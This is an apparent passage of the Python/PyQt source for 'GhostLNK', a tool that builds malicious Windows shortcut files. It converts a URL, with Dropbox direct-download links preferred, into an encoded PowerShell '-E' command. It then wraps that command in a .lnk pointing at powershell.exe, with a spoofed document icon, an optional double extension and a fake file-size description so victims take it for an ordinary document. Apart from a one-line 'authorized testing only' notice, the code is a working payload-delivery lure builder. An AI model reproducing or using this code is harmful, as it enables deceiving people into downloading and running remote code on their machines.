            ps_command = PowerShellConverter.url_to_powershell_with_debug(url, self.pause_after_cb.isChecked())
        else:
            ps_command = PowerShellConverter.url_to_powershell_command(url)
        
        self.ps_command_display.setText(ps_command)
        self.log("[*] Generated PowerShell command")
    
    def encode_url_to_powershell(self):
        url = self.url_input.text().strip()
        if not url:
            QMessageBox.warning(self, "Warning", "Enter a URL")
            return
        
        # Check Dropbox
        is_dropbox, msg = PowerShellConverter.validate_dropbox_url(url)
        if not is_dropbox:
            reply = QMessageBox.question(self, "Dropbox Warning", 
                                        f"{msg}\n\nContinue?",
                                        QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
            if reply == QMessageBox.StandardButton.No:
                return
        
        if self.debug_mode_cb.isChecked():
            ps_command = PowerShellConverter.url_to_powershell_with_debug(url, self.pause_after_cb.isChecked())
        else:
            ps_command = PowerShellConverter.url_to_powershell_command(url)
        
        self.ps_command_display.setText(ps_command)
        encoded = PowerShellConverter.encode_powershell_command(ps_command)
        full_arg = f"-E {encoded}"
        self.full_arg_display.setText(full_arg)
        
        self.log(f"[✓] Encoded ({len(encoded)} chars)")
    
    def copy_full_argument(self):
        full_arg = self.full_arg_display.toPlainText().strip()
        if full_arg:
            QApplication.clipboard().setText(full_arg)
            self.quick_arg_input.setText(full_arg)
            self.log("[✓] Copied to clipboard")
    
    def use_converted_in_lnk(self):
        full_arg = self.full_arg_display.toPlainText().strip()
        if full_arg:
            self.quick_arg_input.setText(full_arg)
            self.current_arg_label.setText(f"Arguments: {full_arg[:100]}...")
            self.log("[✓] Loaded into LNK generator")
    
    def import_from_converter(self):
        arg = self.quick_arg_input.text().strip()
        if arg:
            self.current_arg_label.setText(f"Arguments: {arg[:100]}...")
            self.log("[✓] Imported")
    
    def decode_existing(self):
        encoded = self.decode_input.toPlainText().strip()
        if encoded:
            decoded = PowerShellConverter.decode_powershell_argument(encoded)
            if decoded:
                self.decode_output.setText(decoded[:200] + "...")
                self.log("[✓] Decoded")
    
    def use_recent_conversion(self, item):
        index = self.recent_list.row(item)
        if 0 <= index < len(self.recent_conversions):
            conv = self.recent_conversions[-(index + 1)]
            QMessageBox.information(self, "Info", f"URL: {conv.get('url', 'Unknown')}")
    
    def update_recent_list(self):
        self.recent_list.clear()
        for conv in reversed(self.recent_conversions[-5:]):  # Show fewer
            short = conv['url'][:30] + "..." if len(conv['url']) > 30 else conv['url']
            self.recent_list.addItem(short)
    
    def clear_recent(self):
        self.recent_conversions = []
        self.recent_list.clear()
        self.save_config()
    
    def generate_description(self):
        current_date = datetime.now().strftime("%d/%m/%Y")
        icon_type = self.icon_combo.currentText()
        description = f"Type: {icon_type}\nSize: 1.23 MB\nDate: {current_date}"
        self.description_input.setText(description)
    
    def save_console_log(self):
        file_path, _ = QFileDialog.getSaveFileName(self, "Save Log", "ghostlnk_log.txt", "Text Files (*.txt)")
        if file_path:
            with open(file_path, 'w') as f:
                f.write(self.console.toPlainText())
    
    def log(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.console.append(f"[{timestamp}] {message}")
        cursor = self.console.textCursor()
        cursor.movePosition(cursor.MoveOperation.End)
        self.console.setTextCursor(cursor)
        QApplication.processEvents()
    
    def generate_lnk(self):
        try:
            arg = self.quick_arg_input.text().strip() or self.full_arg_display.toPlainText().strip()
            if not arg:
                QMessageBox.warning(self, "Warning", "No argument set")
                return
            
            icon_type = self.icon_combo.currentText()
            icon_path, icon_index, ext = self.ICON_DATABASE[icon_type]
            
            base_name = self.filename_base.text().strip() or "Document"
            selected_ext = self.filename_ext.currentText()
            output_filename = f"{base_name}{selected_ext}"
            if self.add_lnk_cb.isChecked():
                output_filename += ".lnk"
            
            description = self.description_input.toPlainText().strip()
            if not description:
                self.generate_description()
                description = self.description_input.toPlainText().strip()
            
            save_path, _ = QFileDialog.getSaveFileName(self, "Save LNK", output_filename, "LNK Files (*.lnk)")
            if not save_path:
                return
            
            self.log("👻 Generating...")
            LNKEngine.create_lnk(
                output_filename=save_path,
                target_path=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                arguments=arg,
                icon_path=icon_path,
                icon_index=icon_index,
                description=description
            )
            
            self.log(f"[✓] Saved: {os.path.basename(save_path)}")
            QMessageBox.information(self, "Success", f"LNK saved to:\n{save_path}")
            
        except Exception as e:
            self.log(f"❌ Error: {str(e)}")
            QMessageBox.critical(self, "Error", str(e))
    
    def load_config_dialog(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Load Config", "", "JSON Files (*.json)")
        if file_path:
            try:
                with open(file_path, 'r') as f:
                    config = json.load(f)
                    self.recent_conversions = config.get('recent_conversions', [])
                    self.update_recent_list()
                    self.log("[✓] Config loaded")
            except Exception as e:
                QMessageBox.critical(self, "Error", str(e))
    
    def show_dropbox_help(self):
        QMessageBox.about(self, "Dropbox URLs", 
            "<b>Dropbox URL Format:</b><br><br>"
            "❌ Wrong: dropbox.com/s/abc123/file.pdf<br>"
            "✅ Right: dropbox.com/s/abc123/file.pdf?dl=1<br><br>"
            "<b>Example:</b><br>"
            "https://www.dropbox.com/scl/fi/6z4ogo404tOtr/file_name?rlkey=xxx&dl=1")
    
    def show_about(self):
        QMessageBox.about(self, "About GhostLNK", 
            "<b>GhostLNK v1.0</b><br><br>"
            "Convert URLs to PowerShell -E LNK files<br><br>"
            "⚠️ For authorized testing only")


def main():
    app = QApplication(sys.argv)
    app.setStyle('Fusion')
    
    window = GhostLNKGUI()
    window.show()
    
    sys.exit(app.exec())


if __name__ == "__main__":
    main()
